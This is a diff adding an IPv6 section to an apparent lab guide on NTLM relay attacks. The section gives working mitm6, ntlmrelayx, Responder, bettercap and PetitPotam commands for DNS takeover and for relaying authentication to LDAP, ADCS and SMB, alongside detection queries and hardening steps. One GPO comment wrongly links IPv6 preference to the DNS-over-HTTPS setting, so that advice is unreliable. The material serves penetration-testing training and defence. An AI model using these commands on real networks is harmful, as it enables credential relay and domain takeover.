@@ -17,10 +17,11 @@ A comprehensive guide to NTLM relay attacks - including concepts, lab setup, att
 9. [Shadow Credentials via Relay](#8-shadow-credentials-via-relay)
 10. [RBCD via Relay](#9-rbcd-via-relay)
 11. [SOCKS Relay (Multi-Target)](#10-socks-relay-multi-target)
-12. [Cross-Protocol Relay Matrix](#cross-protocol-relay-matrix)
-13. [Coercion Methods](#coercion-methods)
-14. [Blue Team: Comprehensive Detection](#blue-team-comprehensive-detection)
-15. [Blue Team: Comprehensive Prevention](#blue-team-comprehensive-prevention)
+12. [IPv6 Relay Attacks](#ipv6-relay-attacks)
+13. [Cross-Protocol Relay Matrix](#cross-protocol-relay-matrix)
+14. [Coercion Methods](#coercion-methods)
+15. [Blue Team: Comprehensive Detection](#blue-team-comprehensive-detection)
+16. [Blue Team: Comprehensive Prevention](#blue-team-comprehensive-prevention)
 
 ---
 
@@ -1039,6 +1040,424 @@ ntlmrelayx.py -tf targets.txt -smb2support -socks
 ## Blue Team: Detection & Prevention
 
 Same as individual attack types. SOCKS just extends session lifetime.
+
+---
+
+# IPv6 Relay Attacks
+
+## Overview
+
+Windows prefers IPv6 over IPv4 by default. In most networks, IPv6 isn't properly configured, which creates a powerful attack surface. An attacker can:
+
+1. Respond to DHCPv6 requests to become the DNS server
+2. Serve malicious DNS responses for any query
+3. Redirect traffic to capture NTLM authentication
+4. Relay captured authentication to targets
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                        IPv6 Relay Attack Flow                           │
+└─────────────────────────────────────────────────────────────────────────┘
+
+         DHCPv6 Solicit           DHCPv6 Reply (Attacker = DNS)
+┌────────┐  ─────────────>  ┌──────────┐  <─────────────────  ┌────────┐
+│ Victim │                  │ Network  │                      │Attacker│
+│   PC   │                  │          │                      │ mitm6  │
+└───┬────┘                  └──────────┘                      └───┬────┘
+    │                                                             │
+    │ DNS Query: wpad.akatsuki.local                              │
+    │ ─────────────────────────────────────────────────────────> │
+    │                                                             │
+    │ DNS Reply: wpad = 192.168.56.100 (Attacker)                │
+    │ <───────────────────────────────────────────────────────── │
+    │                                                             │
+    │ HTTP GET /wpad.dat (NTLM Auth)                              │
+    │ ─────────────────────────────────────────────────────────> │
+    │                                                             │
+    │                     RELAY to LDAP/SMB/HTTP                  │
+    │                                           ┌────────────────┐│
+    │                                           │ Target (DC01)  ││
+    │                                           │ LDAP/SMB/HTTP  ││
+    │                                           └────────────────┘│
+```
+
+---
+
+## 11. mitm6 - DHCPv6 DNS Takeover
+
+### Concept
+
+Abuse Windows' preference for IPv6 to become the DNS server via DHCPv6. Once you're the DNS server, you can resolve any hostname to your IP and capture NTLM authentication.
+
+### Root Cause
+
+| Factor | Description |
+|--------|-------------|
+| IPv6 Enabled | Windows enables IPv6 by default |
+| DHCPv6 Trusted | Windows accepts DHCPv6 replies from any source |
+| DNS Priority | IPv6 DNS has higher priority than IPv4 |
+| WPAD Enabled | Browsers auto-fetch proxy configuration |
+| Auto-Auth | Windows auto-authenticates to intranet resources |
+
+### Lab Setup: Verify IPv6 is Enabled
+
+```powershell
+# On workstations - Check IPv6 status (enabled by default)
+Get-NetAdapterBinding -ComponentID ms_tcpip6
+
+# Check if WPAD is enabled (default)
+# Internet Options > Connections > LAN Settings > "Automatically detect settings"
+
+# For testing, ensure WPAD is enabled:
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" -Name "WpadOverride" -Value 0 -Type DWord -Force
+```
+
+### Attack Methods
+
+**Method 1: mitm6 + ntlmrelayx to LDAP**
+
+```bash
+# Terminal 1: Start mitm6 (DHCPv6 + DNS spoofing)
+sudo mitm6 -d akatsuki.local -i eth0
+
+# Options:
+# -d : Target domain
+# -i : Interface
+# --ignore-nofqdn : Ignore queries without FQDN
+
+# Terminal 2: Start relay to LDAP for RBCD
+ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access -smb2support -wh attacker-wpad
+
+# -wh : Hostname for WPAD proxy
+# When machine accounts authenticate, RBCD is configured
+
+# Wait for victims to send DHCPv6 requests (happens periodically ~30 min)
+# Or trigger with: ipconfig /renew6
+```
+
+**Method 2: mitm6 + ntlmrelayx to ADCS**
+
+```bash
+# Terminal 1: mitm6
+sudo mitm6 -d akatsuki.local -i eth0
+
+# Terminal 2: Relay to ADCS for certificate
+ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp --adcs -smb2support -wh attacker-wpad --template DomainController
+
+# When DC01$ authenticates:
+# [*] Got certificate for DC01$
+# [*] Base64 certificate of user DC01$ saved to DC01.b64
+```
+
+**Method 3: mitm6 + ntlmrelayx to SMB**
+
+```bash
+# Terminal 1: mitm6
+sudo mitm6 -d akatsuki.local -i eth0
+
+# Terminal 2: Relay to SMB targets without signing
+ntlmrelayx.py -tf smb-targets.txt -smb2support -wh attacker-wpad
+
+# Create smb-targets.txt with machines that have SMB signing disabled
+# crackmapexec smb 192.168.56.0/24 --gen-relay-list smb-targets.txt
+```
+
+**Method 4: mitm6 + ntlmrelayx for Shadow Credentials**
+
+```bash
+# Terminal 1: mitm6
+sudo mitm6 -d akatsuki.local -i eth0
+
+# Terminal 2: Relay to LDAP for shadow credentials
+ntlmrelayx.py -t ldap://192.168.56.10 --shadow-credentials --shadow-target 'WS01$' -smb2support -wh attacker-wpad
+
+# When WS01$ authenticates via IPv6 DNS:
+# [*] Updating target computer 'WS01$' with shadow credentials
+# [*] Shadow credentials successfully added!
+```
+
+### Alternative Methods
+
+**Using Responder with IPv6**
+```bash
+# Responder can also handle IPv6
+sudo responder -I eth0 -6 -wdP
+
+# -6 : Enable IPv6 poisoning
+```
+
+**Using bettercap**
+```bash
+# bettercap can perform similar attacks
+sudo bettercap -iface eth0
+
+# In bettercap console:
+> set dns.spoof.domains akatsuki.local,wpad.akatsuki.local
+> dns.spoof on
+> set dhcp6.spoof.domains akatsuki.local
+> dhcp6.spoof on
+```
+
+### Blue Team: Detection
+
+| Detection Point | What to Look For |
+|-----------------|------------------|
+| DHCPv6 Logs | Rogue DHCPv6 replies |
+| DNS Queries | DNS queries to unexpected servers |
+| Event ID 5156 | Outbound connections on UDP 547 (DHCPv6) |
+| Event ID 4624 | Authentication from unusual sources |
+| Network | Link-local IPv6 traffic to unknown hosts |
+| Sysmon ID 22 | DNS query events to rogue DNS |
+
+**Detection Queries:**
+```sql
+-- Splunk: Detect DHCPv6 traffic to non-servers
+index=network dest_port=547
+| where NOT match(dest_ip, "^fe80::")
+| stats count by src_ip, dest_ip
+
+-- Detect WPAD requests to unusual hosts
+index=dns query="wpad*"
+| where answer_ip NOT IN (known_wpad_servers)
+```
+
+### Blue Team: Prevention
+
+| Control | Implementation |
+|---------|----------------|
+| Disable IPv6 | GPO: Prefer IPv4 over IPv6 |
+| Disable DHCPv6 | Block UDP 546/547 at firewall |
+| Disable WPAD | GPO: Disable "Automatically detect settings" |
+| WPAD DNS Entry | Create legitimate wpad.domain.local A record |
+| Protected Users | Add sensitive accounts to Protected Users group |
+
+**GPO Settings:**
+```powershell
+# Disable IPv6 preference (prefer IPv4)
+# Computer Configuration > Administrative Templates > Network >
+# DNS Client > Configure DNS over HTTPS (DoH) name resolution = Disabled
+
+# Or via Registry (prefer IPv4):
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" -Name "DisabledComponents" -Value 0x20 -Type DWord
+
+# Disable WPAD auto-detection
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" -Name "WpadOverride" -Value 1 -Type DWord
+```
+
+**Block DHCPv6:**
+```powershell
+# Windows Firewall rule to block DHCPv6 client
+New-NetFirewallRule -DisplayName "Block DHCPv6 Client" -Direction Outbound -Protocol UDP -LocalPort 546 -Action Block
+New-NetFirewallRule -DisplayName "Block DHCPv6 Server" -Direction Outbound -Protocol UDP -LocalPort 547 -Action Block
+```
+
+---
+
+## 12. IPv6 WPAD Attack
+
+### Concept
+
+Specifically target WPAD (Web Proxy Auto-Discovery) through IPv6 DNS takeover. When a browser looks for wpad.domain.local, the attacker's DNS server responds with the attacker's IP.
+
+### Root Cause
+
+| Factor | Description |
+|--------|-------------|
+| WPAD Enabled | Default in Internet Explorer/Edge |
+| No WPAD DNS | Most environments don't have a wpad entry |
+| IPv6 DNS Priority | Attacker's IPv6 DNS answers first |
+| Auto-Auth | Browser sends NTLM auth for proxy config |
+
+### Lab Setup
+
+```powershell
+# On workstation - Ensure WPAD is enabled (default)
+# This is usually on by default in IE/Edge
+
+# Verify there's no legitimate WPAD entry
+nslookup wpad.akatsuki.local
+# Should return: Non-existent domain
+```
+
+### Attack Methods
+
+**Method 1: WPAD Relay to LDAP**
+
+```bash
+# Terminal 1: mitm6 with explicit WPAD handling
+sudo mitm6 -d akatsuki.local -i eth0 --ignore-nofqdn
+
+# Terminal 2: Serve malicious WPAD and relay
+ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access -smb2support -wh attacker-wpad --no-wcf-server
+
+# When victim's browser requests WPAD:
+# 1. DHCPv6 gives attacker as DNS
+# 2. Victim queries wpad.akatsuki.local
+# 3. Attacker responds with their IP
+# 4. Browser fetches http://attacker/wpad.dat with NTLM auth
+# 5. Auth relayed to LDAP
+```
+
+**Method 2: WPAD with Malicious Proxy**
+
+```bash
+# In addition to relaying, serve a malicious WPAD file
+# that proxies all traffic through attacker
+
+# Terminal 1: mitm6
+sudo mitm6 -d akatsuki.local -i eth0
+
+# Terminal 2: ntlmrelayx with WPAD serving
+ntlmrelayx.py -t ldap://192.168.56.10 -smb2support -wh attacker-wpad
+
+# The WPAD file served makes the attacker the proxy
+# Additional traffic can be intercepted
+```
+
+### Blue Team: Prevention
+
+```powershell
+# Create legitimate WPAD DNS entry pointing to nowhere
+# On DC - Add DNS entry
+Add-DnsServerResourceRecordA -Name "wpad" -ZoneName "akatsuki.local" -IPv4Address "127.0.0.1"
+
+# Or point to a legitimate proxy server
+Add-DnsServerResourceRecordA -Name "wpad" -ZoneName "akatsuki.local" -IPv4Address "<proxy-ip>"
+
+# Disable WPAD via GPO
+# User Configuration > Preferences > Windows Settings > Registry
+# HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
+# AutoDetect = 0
+```
+
+---
+
+## 13. IPv6 DNS Takeover for Authentication Coercion
+
+### Concept
+
+Use IPv6 DNS takeover not just for WPAD, but to redirect any internal hostname resolution. This can coerce authentication from services that connect to other internal resources.
+
+### Root Cause
+
+| Factor | Description |
+|--------|-------------|
+| IPv6 DNS Priority | Attacker's DNS answers first |
+| Internal Name Resolution | Services resolve internal names via DNS |
+| Auto-Authentication | Windows auto-authenticates to resolved hosts |
+
+### Attack Methods
+
+**Method 1: Redirect Internal Hostnames**
+
+```bash
+# Terminal 1: mitm6 targeting specific hostnames
+sudo mitm6 -d akatsuki.local -i eth0 --host-allowlist dc01.akatsuki.local,ws01.akatsuki.local
+
+# Terminal 2: Relay connections
+ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access -smb2support
+
+# When a service tries to connect to dc01.akatsuki.local:
+# 1. DNS query goes to attacker's DNS
+# 2. Attacker responds with their IP
+# 3. Service authenticates to attacker
+# 4. Authentication relayed
+```
+
+**Method 2: Target Specific Services**
+
+```bash
+# Target a file server hostname
+sudo mitm6 -d akatsuki.local -i eth0 --host-allowlist fileserver.akatsuki.local
+
+# Relay SMB connections
+ntlmrelayx.py -t smb://192.168.56.11 -smb2support
+
+# Any user accessing \\fileserver\share gets redirected to attacker
+```
+
+### Blue Team: Prevention
+
+- Use DNS signing (DNSSEC) where possible
+- Monitor for rogue DHCPv6 servers
+- Disable IPv6 if not needed
+- Use host files for critical internal names
+
+---
+
+## 14. IPv6 + PrinterBug/PetitPotam Combo
+
+### Concept
+
+Combine IPv6 DNS takeover with coercion techniques. Use mitm6 to capture authentication from machines that try to reach the "attacker" hostname via DNS redirection.
+
+### Attack Methods
+
+**Method 1: IPv6 DNS + PetitPotam**
+
+```bash
+# Terminal 1: mitm6 - take over DNS
+sudo mitm6 -d akatsuki.local -i eth0
+
+# Terminal 2: Relay to ADCS
+ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp --adcs -smb2support -wh attacker-wpad --template DomainController
+
+# Terminal 3: Use PetitPotam to coerce DC to our IPv6 address
+# First, get your IPv6 address
+ip -6 addr show eth0
+# fe80::1 (example)
+
+# Coerce using IPv6 address
+python3 PetitPotam.py 'fe80::1%eth0' 192.168.56.10 -u orochimaru -p 'Snake2024!'
+```
+
+**Method 2: Full Chain with IPv6**
+
+```bash
+# Step 1: Take over DNS
+sudo mitm6 -d akatsuki.local -i eth0
+
+# Step 2: Wait for DHCPv6 (or trigger with ipconfig /renew6 on target)
+
+# Step 3: Any internal DNS query now comes to us
+# When DC01 authenticates via WPAD or other mechanism:
+# Relay to ADCS, get certificate, authenticate as DC
+```
+
+### Blue Team: Detection
+
+```yaml
+Detection Rules:
+  - Unusual DHCPv6 traffic from non-DHCP servers
+  - IPv6 DNS queries to link-local addresses
+  - WPAD requests over IPv6
+  - NTLM authentication following IPv6 DNS resolution
+```
+
+---
+
+## IPv6 Attack Quick Reference
+
+| Attack | Command |
+|--------|---------|
+| mitm6 Basic | `sudo mitm6 -d <domain> -i <interface>` |
+| mitm6 + LDAP Relay | `ntlmrelayx.py -t ldap://<dc> --delegate-access -wh attacker-wpad` |
+| mitm6 + ADCS | `ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs -wh attacker-wpad` |
+| mitm6 + SMB Relay | `ntlmrelayx.py -tf targets.txt -smb2support -wh attacker-wpad` |
+| mitm6 + Shadow Creds | `ntlmrelayx.py -t ldap://<dc> --shadow-credentials -wh attacker-wpad` |
+| Disable IPv6 | `Set-ItemProperty HKLM:\...\Tcpip6\Parameters -Name DisabledComponents -Value 0x20` |
+| Block DHCPv6 | Block UDP 546/547 outbound |
+
+---
+
+## IPv6 Tool Reference
+
+| Tool | Purpose | URL |
+|------|---------|-----|
+| mitm6 | DHCPv6/DNS spoofing | https://github.com/dirkjanm/mitm6 |
+| ntlmrelayx | NTLM relay | https://github.com/fortra/impacket |
+| bettercap | Network attacks | https://github.com/bettercap/bettercap |
+| Responder | IPv6 poisoning | https://github.com/lgandx/Responder |
 
 ---
 
